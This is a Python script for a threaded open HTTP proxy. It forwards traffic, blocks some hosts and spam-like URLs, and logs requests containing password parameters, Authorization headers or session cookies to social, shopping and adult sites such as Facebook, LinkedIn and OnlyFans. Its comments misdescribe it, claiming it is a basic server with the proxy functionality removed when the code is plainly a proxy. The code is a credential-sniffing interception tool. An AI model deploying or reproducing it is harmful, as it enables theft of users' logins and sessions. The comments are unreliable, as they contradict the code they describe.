# ability to serve as a basic HTTP server and handle requests
# This Python code creates a simple HTTP server that intercepts
# and logs HTTP requests and responses. It listens on the parsed
# url port and forwards requests to the destination server.
# Requests to blocked destinations are rejected with a 403 Forbidden
# response. Interesting requests (based on specified patterns)
# are logged to the proxy.log file.

# run this HTTP server code in one terminal and the
# modified Jellyfish code in another terminal to see the
# Jellyfish navigating through the internet via the server.

import http.server
import socketserver
import signal
import sys
import re
import time
import urllib.parse

from http import HTTPStatus

# log requests that match the following patterns
gGETRegex = "(pass=|passwd=|pwd=|password=)"
gPOSTRegex = gGETRegex
gCookieRegex = "(pass=|passwd=|pwd=|password=|session|sid)"
gDstRegex = "\.(cammodels|onlyfans|chaturbate|facebook|linkedin|skype|xing|myspqce|amazon|ebay|hi5|flickr|youtube|craiglist|skyrock|blogger|wordpress|netlog)\."


# general settings
gLogFile = "./AAA.txt"
gDEBUG = 2

gBLOCKDestinations = ['\.rapidshare\.com',  
                      '\.blogspot\.com',
                      'www\.google\.',
                      '\.yahoo\.',
                      '\.live\.',
                      '\.gov',
                      ]

gBLOCKURI = ['viagra',
             'cialis',
             'reply',
             'gbook',
             'guestbook',
             'iframe',
             '\/\/ads?\.',
             'http:\/\/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}',
             'comment'
             ]


class ProxyHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.proxy_request()

    def do_POST(self):
        self.proxy_request()

    def proxy_request(self):
        try:
            request_headers = dict(self.headers)
            request_body = None
            if 'Content-Length' in request_headers:
                content_length = int(request_headers['Content-Length'])
                request_body = self.rfile.read(content_length)

            # parse request URL
            parsed_url = urllib.parse.urlparse(self.path)
            dest_host = parsed_url.hostname
            dest_port = parsed_url.port if parsed_url.port else 80
            dest_path = parsed_url.path

            # check if destination is blocked
            for pattern in gBLOCKDestinations:
                if re.search(pattern, dest_host, re.IGNORECASE):
                    self.send_error(HTTPStatus.FORBIDDEN)
                    return

            # Block certain URIs
            for pattern in gBLOCKURI:
                if re.search(pattern, self.path, re.IGNORECASE):
                    self.send_error(HTTPStatus.FORBIDDEN)
                    return

             # Log interesting requests
            is_interesting = 0
            if 'Authorization' in request_headers:
                is_interesting += 1
            if re.search(gGETRegex, self.path, re.IGNORECASE):
                is_interesting += 1
            if request_body and re.search(gPOSTRegex, request_body.decode(), re.IGNORECASE):
                is_interesting += 1
            if 'Cookie' in request_headers and re.search(gCookieRegex, request_headers['Cookie'], re.IGNORECASE):
                is_interesting += 1
            if is_interesting > 0 and re.search(gDstRegex, dest_host, re.IGNORECASE):
                log_request(self.client_address[0], self.command, self.path)

            # Prepare request headers
            del request_headers['Proxy-Connection']
            if 'Connection' in request_headers:
                del request_headers['Connection']
            request_headers['Connection'] = 'Close'
            request_headers['X-Forwarded-For'] = self.client_address[0]

            # Send request to destination server
            connection = http.client.HTTPConnection(dest_host, dest_port)
            connection.request(self.command, dest_path, headers=request_headers, body=request_body)
            response = connection.getresponse()

            # Send response back to client
            self.send_response(response.status)
            for header, value in response.getheaders():
                self.send_header(header, value)
            self.end_headers()
            self.wfile.write(response.read())

        except Exception as e:
            print("Error:", e)
            self.send_error(HTTPStatus.INTERNAL_SERVER_ERROR)


def log_request(client_ip, method, uri):
    try:
        with open(gLogFile, "a") as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - REQUEST - {client_ip} -> {method} {uri}\n")
    except Exception as e:
        print("Error logging request:", e)


class ThreadedHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True


def signal_handler(sig, frame):
    print('Exiting...')
    sys.exit(0)


def main():
    signal.signal(signal.SIGINT, signal_handler)
    server = ThreadedHTTPServer(('0.0.0.0', 8000), ProxyHandler)
    server.serve_forever()


if __name__ == "__main__":
    main()



# This code retains the ability to handle HTTP requests and log
# them but removes the proxy functionality and port scanning
# aspects. It only serves as a basic HTTP server now.